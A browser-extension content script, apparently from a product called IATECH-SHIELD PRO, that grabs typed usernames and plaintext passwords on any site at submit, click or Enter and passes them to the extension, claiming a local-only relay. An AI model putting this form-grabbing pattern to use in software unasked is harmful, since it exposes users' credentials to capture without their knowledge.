// IATECH-SHIELD PRO — script de contenu
// Détecte la saisie d'un couple identifiant / mot de passe, et le transmet à
// l'extension (qui le relaie à l'application locale). Rien n'est envoyé sur Internet.

(function () {
  "use strict";

  function extractCredentials(root) {
    const pwd = root.querySelector('input[type="password"]');
    if (!pwd || !pwd.value) return null;

    // Cherche le champ identifiant le plus proche (email / texte) ayant une valeur.
    let username = "";
    const candidates = (root.querySelectorAll
      ? root.querySelectorAll('input[type="email"], input[type="text"], input[type="tel"], input:not([type])')
      : []);
    for (const input of candidates) {
      if (input.value && input.type !== "password") username = input.value;
    }
    return {
      url: location.origin + location.pathname,
      username: username,
      password: pwd.value
    };
  }

  function tryCapture(target) {
    try {
      const form = target && target.closest ? (target.closest("form") || document) : document;
      const cred = extractCredentials(form);
      if (cred) chrome.runtime.sendMessage({ type: "iatech-cred", data: cred });
    } catch (_) { /* ignore */ }
  }

  // Soumission classique de formulaire.
  document.addEventListener("submit", function (e) { tryCapture(e.target); }, true);

  // Connexions « SPA » : clic sur un bouton de type submit / connexion.
  document.addEventListener("click", function (e) {
    const t = e.target;
    if (!t) return;
    const isButton = t.tagName === "BUTTON" || (t.tagName === "INPUT" && (t.type === "submit" || t.type === "button"));
    if (isButton) setTimeout(function () { tryCapture(t); }, 50);
  }, true);

  // Touche Entrée dans un champ mot de passe.
  document.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && e.target && e.target.type === "password") tryCapture(e.target);
  }, true);
})();
